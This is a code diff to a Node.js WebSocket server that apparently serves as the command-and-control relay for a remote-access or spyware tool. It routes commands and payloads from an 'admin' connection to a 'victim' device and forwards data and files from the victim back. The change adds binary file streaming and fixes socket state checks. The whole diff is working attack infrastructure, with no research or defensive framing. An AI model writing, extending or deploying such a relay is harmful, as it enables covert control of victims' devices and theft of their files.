@@ -1,5 +1,5 @@
 const express = require('express');
-const { WebSocketServer } = require('ws');
+const { WebSocketServer, WebSocket } = require('ws');
 const http = require('http');
 
 const app = express();
@@ -26,23 +26,25 @@ wss.on('connection', (ws, req) => {
     }
 
     ws.on('message', (message) => {
-        const messageStr = message.toString();
-        console.log(`Received message from [${role}]: ${messageStr}`);
+        // Handle both string text commands and binary buffers (file streams)
+        const isBinary = Buffer.isBuffer(message);
+        const logContent = isBinary ? `[Binary Buffer: ${message.length} bytes]` : message.toString();
+        console.log(`Received message from [${role}]: ${logContent}`);
 
         if (role === 'admin') {
-            if (victimSocket && victimSocket.readyState === ws.OPEN) {
-                victimSocket.send(messageStr);
-                console.log('-> Successfully forwarded command to Victim.');
+            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
+                victimSocket.send(message);
+                console.log('-> Successfully forwarded command/payload to Victim.');
             } else {
                 console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
-                if (adminSocket && adminSocket.readyState === ws.OPEN) {
+                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                     adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
                 }
             }
         } else if (role === 'victim') {
-            if (adminSocket && adminSocket.readyState === ws.OPEN) {
-                adminSocket.send(messageStr);
-                console.log('-> Successfully forwarded data payload to Admin.');
+            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+                adminSocket.send(message);
+                console.log('-> Successfully forwarded data payload/file to Admin.');
             } else {
                 console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
             }
